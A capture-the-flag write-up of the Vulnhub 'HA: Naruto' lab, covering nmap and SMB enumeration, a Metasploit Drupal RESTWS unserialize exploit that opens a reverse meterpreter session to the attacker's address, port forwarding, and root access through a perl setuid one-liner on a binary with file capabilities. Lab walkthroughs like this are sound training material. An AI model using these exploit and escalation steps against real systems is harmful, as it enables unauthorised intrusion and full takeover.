---
title: 'HA: Naruto Vulnhub Walkthrough'
date: 2019-10-24T16:25:00+01:00
draft: false
---

This is our Walkthrough for “HA: Naruto” and this CTF is designed by Hacking Articles Team, hope you will enjoy this.

Book your tickets to The Konohagakure, and train under Master Jiraiya,  Hokage Uzumaki, and Tsunade.  Use your hacking skills to stop Orrochimaru and Rescue Sasuke.  Hack this boot to root and get  the  title  of  “The Number  One  Hyperactive,  Knucklehead  Ninja”

Level:

You can download this lab from here.

**Let’s Begin!!**

### **Penetration Testing Methodologies**

**Scanning Network**

*   netdiscover
*   Nmap

**Enumeration**

*   Browsing HTTP Service
*   Samba Client (Smb Client)

**Exploiting**

*   Drupal-Metasploit

**Privilege Escalation**

*   Capabilities

### Network Scanning

Firsts of all we try to identify our target and for this use the following command:

```
netdiscover
```

Now we will run an aggressive port scan using Nmap to gain the information about the open ports and the services running on the target machine.

```
nmap -A 192.168.0.4
```

With the help of the scan, we now know that port number 80,22,139 and 445 are open with Apache, SSH and Smb service running.

![](https://i0.wp.com/1.bp.blogspot.com/-rEw0CmL3etY/XbG_ONU5FqI/AAAAAAAAhGQ/_n7cGl2R4Fwiw_E74o9LoZrBvc6edzX4gCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

### Enumeration

Further, we started enumeration against the target machine and therefore we navigated to a web browser for exploring HTTP service. And we got a page of Naruto as shown below: –

![](https://i0.wp.com/1.bp.blogspot.com/-gDcc_J4B_ms/XbG_OMDdtOI/AAAAAAAAhGU/HJHM2_kN3ygbdlxR4ptcpeQWvRxcWxBFwCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

Smbclient

Smbclient is a customer that can ‘converse with’ an SMB server. It offers an interface like that of the FTP program. It can perform activities like getting records from the server to the nearby machine, putting documents from the neighborhood machine to the server, recovering catalog data from the server.

We used the following command to view files in smbclient.

```
smbclient -L \\\\192.168.0.4
```

![](https://i0.wp.com/1.bp.blogspot.com/-vwRioot6jus/XbG_OFKUnlI/AAAAAAAAhGM/6Az893aiJnwEj2UI9x49GYEveN7pNIkYwCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

As we can observe with the help of smbclient we are able to view the shared folder and files of the victim’s machine. Moreover, we can use smbclient for sharing a file in the network. Therefore, we found a text file by name of uzumaki.txt which we downloaded into our machine by using the following command.

```
smbclient //192.168.0.4/Naruto
```

Then we used the cat command to open the text file and got a hint “Gara” as we saw that word is in double-quotes in the text file.

![](https://i2.wp.com/1.bp.blogspot.com/-zOf-I7BXyWU/XbG_O18bM7I/AAAAAAAAhGY/pRYPPMoQOoAHJcOIzbnsxZa7AUlHWXnZQCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

We tried this hint and opened it on the browser page where we got a Welcome page.

![](https://i2.wp.com/1.bp.blogspot.com/-spTdH5rT0U0/XbG_Pb7i9_I/AAAAAAAAhGc/j9Rvf6WAf-Y_HqwZWWcyVaqiJYVwZ1qvQCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

### Exploitation

Now we will use our old friend Metasploit to exploit the Drupal Page we found earlier.

```
msf5 > use exploit/unix/webapp/drupal\_restws\_unserialize  
msf5 exploit (unix/webapp/ drupal\_restws\_unserialize) > set rhosts 192.168.0.4  
msf5 exploit (unix/webapp/ drupal\_restws\_unserialize) > set targeturi /gara  
msf5 exploit (unix/webapp/ drupal\_restws\_unserialize) > set lhost 192.168.0.5  
msf5 exploit (unix/webapp/ drupal\_restws\_unserialize) > exploit
```

Booom!! Our favourite meterpreter session is all here, let’s go for Post enumeration.

After getting into the meterpreter session we used the “shell” command to get a shell on the target system. This came back to be an improper shell.

Now we used our python one-liner to invoke a proper shell on the target machine. After getting the shell we saw that the shell we got is of user “www-data”.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

We will go for the post enumeration using the following command which shows us all the connections with their ports.

```
netstat -antp
```

![](https://i1.wp.com/1.bp.blogspot.com/-C7IFXXIY5C0/XbG_PTdXDjI/AAAAAAAAhGg/zaA85uzjp4IE3Ob6hEHdGs1MHcnEM4IygCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

If we check our local network static for TCP and UDP connections, we will see that there’s something running 8080 and even nmap doesn’t display anything for this. With the aid of the meterpreter, we have forwarded service port 8080 to our local host:8080.

```
portfwd add -l 8080 -p 8080 -r 127.0.0.1
```

![](https://i2.wp.com/1.bp.blogspot.com/-lx61jKktnWg/XbG_PgrMZDI/AAAAAAAAhGk/krk_5iCt_vsNgC2etwCBsXCvUVr3w05kACLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

Once we have forwarded the service over to our local machine then we can explore it the web browser as we have done here.

This will provide us with the following credentials:

```
User: yashika  
Password: raj@123
```

### Privilege Escalation

Now we got to do is run su command which will give all root permissions to that user and therefore we successfully logged in using the following credentials:

```
su yashika  
raj@123
```

![](https://i2.wp.com/1.bp.blogspot.com/-LUCcWFNfu0c/XbG_P49neyI/AAAAAAAAhGo/sMZTi45rA9MGC-op8H4FMPucAzwLTdZtQCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

In Linux, files can be provided with a capability to access specific files majorly critical files with specific permissions only; like a script file can be provided with the capability to read ssh configuration files or /etc/shadow file which can be done using getcap  so we will use the following command to find out the capabilities of the user and whether those capabilities are enabled or not:

```
getcap -r / 2>/dev/null
``````
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
``````
id  
cd /root  
ls  
cat final.txt
```

![](https://i1.wp.com/1.bp.blogspot.com/--kfMzHHlN9U/XbG_QcXcqyI/AAAAAAAAhGs/yTgAAqXMkQAeKESLIBzvn0zjFRnVF9apQCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

And so, we found our Hero: NARUTO (“The Number One Hyperactive, Knucklehead Ninja”)

**Author: Rishabh Kant** is a Penetration tester, Certified Ethical Hacker and researcher Contact [**here**](https://www.linkedin.com/in/rishabh-kant-46a06814b/)

The post [HA: Naruto Vulnhub Walkthrough](https://www.hackingarticles.in/ha-naruto-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/367xBj1